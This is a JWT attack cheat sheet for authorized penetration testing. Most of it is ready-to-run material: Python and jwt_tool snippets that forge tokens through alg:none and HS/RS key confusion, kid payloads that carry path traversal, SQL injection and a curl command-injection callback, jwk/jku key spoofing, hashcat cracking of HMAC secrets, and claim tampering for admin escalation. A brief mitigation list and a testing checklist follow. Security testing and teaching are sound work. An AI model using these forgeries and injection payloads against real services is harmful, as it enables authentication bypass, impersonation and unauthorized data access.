## 🔐 JWT Cheat Sheet

> **Scope:** Authorized testing only — systems you own or have explicit written permission to test. Use placeholders (`<TARGET>`, `<TOKEN>`, `<USER>`); never store real flags, API keys, or credentials.

---

### ⚡ 1. Quick Reference

| Attack | Core idea |
|--------|-----------|
| `alg:none` | Verifier trusts header; empty signature, trailing dot required |
| HS/RS confusion | Public key reused as an HMAC secret |
| `kid` injection | Key lookup becomes path / SQL / command injection |
| `jwk` / `jku` / `x5u` | Attacker-supplied key material or key-fetch URL |
| Weak HMAC secret | Offline recovery with `hashcat -m 16500` |
| Claim tampering | `exp`, `sub`, `role`, `iss`, `aud`, `jti` |

### 🔍 2. Decode & Forge

```bash
python3 jwt_tool.py <TOKEN>                 # decode + validate
python3 jwt_tool.py <TOKEN> -T              # interactive tamper
```

```python
import base64, json, hmac, hashlib
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
enc = lambda o: b64(json.dumps(o, separators=(",", ":")).encode())
h, p = enc({"alg": "HS256", "typ": "JWT"}), enc({"sub": "<USER>", "role": "admin"})
si = f"{h}.{p}".encode()
print(f"{h}.{p}." + b64(hmac.new(b"<SHARED_SECRET>", si, hashlib.sha256).digest()))
```

### 🚫 3. `alg:none` Bypass (CVE-2015-2951)

```bash
python3 - <<'PY'
import base64, json
b = lambda x: base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({"alg":"none","typ":"JWT"}) + '.' + b({"sub":"<USER>","role":"admin"}) + '.')
PY
python3 jwt_tool.py <TOKEN> -X a
```

Try `"None"`, `"NONE"`, `"nOnE"`, duplicate `alg` keys, and arbitrary text in the signature segment.

### 🔁 4. HS/RS Algorithm Confusion (CVE-2016-10555)

If an asymmetric verifier is tricked into HS256, the **public key bytes become the HMAC secret**. Obtain it from a JWKS endpoint, certificate, or source repo.

```python
with open("<PUBLIC_KEY>.pem", "rb") as f: pem = f.read()   # helpers from section 2
h, p = enc({"alg": "HS256", "typ": "JWT"}), enc({"sub": "<USER>", "role": "admin"})
si = f"{h}.{p}".encode()
for key in (pem, pem.rstrip(b"\n"), b"<JWK_N_B64URL>"):
    print(b64(hmac.new(key, si, hashlib.sha256).digest()))
```

```bash
python3 jwt_tool.py <TOKEN> -X k -pk <PUBLIC_KEY>.pem   # key confusion
python3 jwt_tool.py <TOKEN> -V -jw <JWKS_FILE>.json     # verify candidate key
```

Also try SPKI DER and the JWK modulus `n` as the secret.

### 🗝️ 5. `kid` Header Attacks

| `kid` value | Goal |
|-------------|------|
| `../../../../dev/null` | Sign with a predictable/empty secret |
| `k1' UNION SELECT '<KNOWN_SECRET>' -- ` | Return an attacker-chosen key from SQL |
| `k1; curl <TARGET>/<OOB_ID>` | Command-injection callback (buggy implementations only) |

```json
{"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
{"alg": "HS256", "typ": "JWT", "kid": "k1' UNION SELECT 'KNOWN_SECRET' -- "}
```

```bash
python3 jwt_tool.py <TOKEN> -I -hc kid -hv kid_payloads.txt -S hs256 -p "<KNOWN_SECRET>"
```

### 🌐 6. `jwk` / `jku` / `x5u` Injection

| Header | Mechanism |
|--------|-----------|
| `jwk` | Inline public key in header (CVE-2018-0114); sign with matching private key |
| `jku` | URL of a JWKS the server fetches before verifying |
| `x5u` / `x5c` | Remote certificate URL / inline chain; test chain validation |

```json
{"alg": "RS256", "typ": "JWT", "kid": "<KEY_ID>",
 "jwk": {"kty": "RSA", "use": "sig", "kid": "<KEY_ID>", "n": "<N_B64URL>", "e": "AQAB"}}
```

```bash
python3 jwt_tool.py <TOKEN> -X i                        # inject inline JWKS
python3 jwt_tool.py <TOKEN> -X s -ju <YOUR_JWKS_URL>     # spoof remote JWKS
python3 jwt_tool.py <TOKEN> -I -hc jku -hv jku_urls.txt  # fuzz URL handling / SSRF
```

An out-of-band callback proves a fetch, not that untrusted keys are accepted.

### 💥 7. Weak Secrets & Claim Tampering

```bash
echo '<TOKEN>' > jwt.txt
hashcat -m 16500 jwt.txt <WORDLIST> -r rules/best64.rule
python3 jwt_tool.py <TOKEN> -C -d <WORDLIST>
python3 jwt_tool.py -t https://<TARGET>/ -rc "session=<TOKEN>" -cv "<CANARY>" -M pb
```

| Claim | Test |
|-------|------|
| `exp` / `nbf` / `iat` | Remove expiry; extend lifetime; clock skew |
| `sub` / `user_id` | Impersonate <USER> |
| `role` / `scope` / `admin` | Privilege escalation |
| `iss` / `aud` / `jti` | Cross-service reuse; replay after logout |

### 🛠️ 8. Tooling & Impact

| Tool | Use |
|------|-----|
| **jwt_tool** | `-M pb` scan, `-X a/k/i/s` exploits, `-S` sign, `-C` crack |
| **Burp JWT Editor** | Edit/sign tokens in Proxy and Repeater |
| **hashcat `-m 16500`** | Offline HS256 secret recovery |

Impact: authentication bypass, impersonation, privilege escalation, tenant data access, replay after revocation, and SSRF/SQLi via `jku`/`kid`.

---

### 🛡️ 9. Mitigation

1. Pin an algorithm allowlist server-side; never trust the header's `alg`.
2. Reject `none` and any algorithm not configured for the issuer.
3. Separate symmetric and asymmetric keys; enforce key type per algorithm.
4. Trust `jku`/`x5u` only from pinned origins — preferably not at all.
5. Resolve `kid` through an internal map; never pass it to file/SQL/shell APIs.
6. Use ≥256-bit HMAC secrets, validate `iss`/`aud`/`exp`/`jti`, and authorize server-side.

---

### ✅ 10. Testing Checklist

- [ ] Decode header, claims, issuer, and expiry.
- [ ] Test `alg:none` variants and empty/arbitrary signatures.
- [ ] Test RS→HS confusion with the published public key.
- [ ] Test `kid` traversal, SQLi, and known-file signing.
- [ ] Test inline `jwk` and remote `jku`/`x5u` injection.
- [ ] Attempt in-scope offline HMAC recovery; verify logout revocation.

---

### 📚 11. References

- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)
- [PortSwigger JWT attacks](https://portswigger.net/web-security/jwt)
- [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki)

**🔐 Happy authorized testing!**
